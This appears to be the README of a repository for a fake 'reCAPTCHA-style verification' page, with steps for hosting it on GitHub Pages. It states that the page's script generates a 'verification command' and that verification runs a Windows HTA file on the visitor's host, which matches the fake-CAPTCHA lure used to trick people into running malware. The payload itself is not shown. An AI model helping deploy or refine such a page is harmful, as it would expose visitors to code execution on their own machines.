# V-job

This project is a static reCAPTCHA-style verification demo that can be hosted from the repository root.

## What was prepared for hosting

- Added a root entry page at [index.html](index.html) that redirects to the app in [kio-main/index.html](kio-main/index.html).
- Added [404.html](404.html) for friendly fallback routing on static hosts.
- Added [.nojekyll](.nojekyll) so GitHub Pages serves the site without Jekyll processing.
- Fixed the verification command path generation in [kio-main/assets/js/main.js](kio-main/assets/js/main.js) so it works from a subfolder-hosted deployment.

## Preview locally

Run a simple local server from the repository root:

```bash
python3 -m http.server 8000
```

Then open:

- http://127.0.0.1:8000/
- http://127.0.0.1:8000/kio-main/index.html

## Deploy to GitHub Pages

1. Push this repository to GitHub.
2. Open the repository settings.
3. Navigate to Pages.
4. Choose the branch and root folder (for example, root or main).
5. Save the settings.

The site should be available at:

```text
https://<your-username>.github.io/<repo-name>/
```

## Notes

The page uses a static HTML/CSS/JS structure with one Windows-specific HTA file at [kio-main/verify-captcha](kio-main/verify-captcha). The interactive behavior is designed for a browser environment, while the verification step targets a Windows host.
